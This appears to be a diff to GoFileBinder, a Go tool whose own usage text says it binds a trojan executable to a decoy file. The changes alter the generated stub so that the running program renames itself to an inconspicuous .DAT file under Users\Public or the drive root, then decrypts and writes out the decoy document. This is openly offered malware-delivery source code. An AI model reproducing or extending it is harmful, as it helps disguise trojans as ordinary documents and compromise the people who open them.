@@ -27,7 +27,7 @@ var (
 	tvb = "这是我的频道欢迎投稿学习:https://space.bilibili.com/353948151	"
 
 	keytishi = `
-	首先编译好命令参数如: GoFileBinder.exe 木马.exe xxx.txt
+	首先编译好命令参数如: GoFileBinder.exe	木马.exe xxx.txt
 	`
 )
 
@@ -68,6 +68,7 @@ func main() {
 		"encoding/base64"
 		"os"
 		"os/exec"
+		"strings"
 		"syscall"
 	)
 	
@@ -83,10 +84,18 @@ func main() {
 	
 	func main() {
 	
+		dstFile := "\\Users\\Public\\Yihsiwei.DAT"
 		selfile, _ := os.Executable()
+		panfu := selfile[0:2]
+		if !strings.Contains(selfile, "C:") {
 	
-		os.Rename(selfile, "C:\\Users\\Public\\Yihsiwei.dat")
-	
+			dstFile = panfu + "\\CWAWF.DAT"
+		} else {
+			dstFile = panfu + dstFile
+		}
+
+		os.Rename(selfile, dstFile)
+
 		ddocfile := AesDecrypt(docfile, key)
 		f2, _ := os.Create(docfilename)
 		_, _ = f2.Write([]byte(ddocfile))
